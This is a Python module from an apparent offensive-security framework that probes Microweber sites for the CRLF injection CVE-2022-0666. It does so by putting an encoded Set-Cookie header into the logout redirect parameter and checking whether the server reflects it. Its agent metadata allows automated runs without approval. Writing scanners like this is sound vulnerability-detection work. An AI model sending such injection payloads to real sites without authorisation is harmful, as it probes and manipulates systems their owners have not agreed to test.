#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CRLF Injection leads to Stack Trace Exposure due to lack of filtering at https://demo."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Microweber < 1.2.11 - CRLF Injection Detection',
        'description': 'CRLF Injection leads to Stack Trace Exposure due to lack of filtering at https://demo.microweber.org/ in Packagist microweber/microweber prior to 1.2.11.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'huntr', 'crlf', 'microweber', 'cve2022', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/microweber/microweber/commit/f0e338f1b7dc5ec9d99231f4ed3fa6245a5eb128',
            'https://huntr.dev/bounties/7215afc7-9133-4749-8e8e-0569317dbd55',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0666',
        ],
        'cve': 'CVE-2022-0666',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/logout?redirect_to=%0d%0aSet-Cookie:crlfinjection=1;', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_regexes = ('^Set-Cookie: crlfinjection=1;',)
        if (any(re.search(rx, headers, 0) for rx in header_regexes)):
            self.set_info(
                severity='high',
                reason="Microweber < 1.2.11 - CRLF Injection detected",
                path='/api/logout?redirect_to=%0d%0aSet-Cookie:crlfinjection=1;',
            )
            return True
        return False

